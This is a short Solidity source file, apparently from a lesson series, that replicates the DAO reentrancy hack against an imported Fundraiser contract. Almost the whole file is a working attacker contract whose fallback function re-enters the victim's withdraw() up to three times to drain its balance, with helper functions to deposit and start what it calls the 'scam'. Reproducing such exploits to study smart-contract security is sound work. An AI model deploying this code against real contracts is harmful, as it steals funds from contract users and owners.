pragma solidity ^0.4.10;

// DAO_Hack - Replicating the Vulnerability

import "./7_Fundraiser.sol";

contract Attacker {
    
    address public fundraiserAddress;
    uint public drainTimes = 0;
    
    function Attacker(address victimAddress) {
        fundraiserAddress = victimAddress;
    }
    
    function() payable {
        if(drainTimes < 3) {
            drainTimes++;
            Fundraiser(fundraiserAddress).withdraw();
        }
    }
    
    function getFunds() public returns (uint) {
        return address(this).balance;
    }
    
    function payMe() public payable {
        Fundraiser(fundraiserAddress).contribute.value(msg.value)();
    }
    
    function startScam() public {
        Fundraiser(fundraiserAddress).withdraw();
    }
    
}